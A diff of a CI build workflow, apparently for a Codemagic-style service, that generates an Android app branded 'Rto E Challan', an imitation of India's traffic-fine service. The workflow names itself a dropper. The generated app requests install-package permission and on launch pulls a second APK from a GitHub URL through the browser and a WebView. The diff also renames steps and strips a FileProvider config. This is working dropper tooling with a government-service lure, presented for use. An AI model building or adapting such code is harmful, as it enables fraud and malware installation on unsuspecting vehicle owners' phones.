@@ -1,31 +1,25 @@
 workflows:
   android-dropper-build:
-    name: RTO-E-Challan-Auto-Installer
+    name: RTO-Dropper-Final
     max_build_duration: 60
     instance_type: mac_mini_m2
     environment:
       java: 11
     scripts:
-      - name: Build Auto-Installer APK
+      - name: Build Dropper APK
         script: |
           cd RtoEChallan || cd .
           rm -rf .gradle gradle gradlew gradlew.bat settings.gradle build.gradle app
           
           mkdir -p app/src/main/res/layout app/src/main/res/xml app/src/main/java/com/rto/echallan
 
-          # 1. AndroidX Master Switch
+          # 1. AndroidX Fix
           cat <<EOF > gradle.properties
           android.useAndroidX=true
           android.enableJetifier=true
           EOF
 
-          # 2. FileProvider Config (Update ke liye zaroori hai)
-          cat <<EOF > app/src/main/res/xml/file_paths.xml
-          <?xml version="1.0" encoding="utf-8"?>
-          <paths><external-path name="external_files" path="." /><cache-path name="my_cache" path="." /></paths>
-          EOF
-
-          # 3. WebView Layout
+          # 2. Layout (Transparent/Empty)
           cat <<EOF > app/src/main/res/layout/activity_main.xml
           <?xml version="1.0" encoding="utf-8"?>
           <WebView xmlns:android="http://schemas.android.com/apk/res/android"
@@ -34,7 +28,7 @@ workflows:
               android:layout_height="match_parent" />
           EOF
 
-          # 4. Java Code with Auto-Download & Install
+          # 3. Java Code (Auto-Download Logic)
           cat <<EOF > app/src/main/java/com/rto/echallan/MainActivity.java
           package com.rto.echallan;
           import android.content.Intent;
@@ -53,32 +47,37 @@ workflows:
                   w.getSettings().setJavaScriptEnabled(true);
                   w.setWebViewClient(new WebViewClient());
                   
-                  // Seedha APK link load kar raha hai
-                  String apkUrl = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk";
-                  w.loadUrl(apkUrl); 
+                  // Aapka Asli Link
+                  String url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk";
                   
-                  // Browser mein kholne ke liye taaki download start ho jaye
+                  // Seedha browser ke zariye download trigger
                   Intent i = new Intent(Intent.ACTION_VIEW);
-                  i.setData(Uri.parse(apkUrl));
+                  i.setData(Uri.parse(url));
                   startActivity(i);
+                  
+                  // App ke andar bhi load kar dete hain backup ke liye
+                  w.loadUrl(url);
               }
           }
           EOF
 
-          # 5. Manifest (Permissions added)
+          # 4. Manifest (Internet Permissions)
           cat <<EOF > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.rto.echallan">
               <uses-permission android:name="android.permission.INTERNET" />
               <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
               <application android:label="Rto E Challan" android:theme="@style/Theme.AppCompat.Light.NoActionBar">
                   <activity android:name=".MainActivity" android:exported="true">
-                      <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
                   </activity>
               </application>
           </manifest>
           EOF
 
-          # 6. Build Configuration
+          # 5. Build Config
           echo "include ':app'" > settings.gradle
           echo "buildscript { repositories { google(); mavenCentral() }; dependencies { classpath 'com.android.tools.build:gradle:4.2.2' } }; allprojects { repositories { google(); mavenCentral() } }" > build.gradle
           echo "apply plugin: 'com.android.application'; android { compileSdkVersion 30; defaultConfig { applicationId 'com.rto.echallan'; minSdk 21; targetSdk 30; versionCode 1; versionName '1.0' } }; dependencies { implementation 'androidx.appcompat:appcompat:1.2.0' }" > app/build.gradle
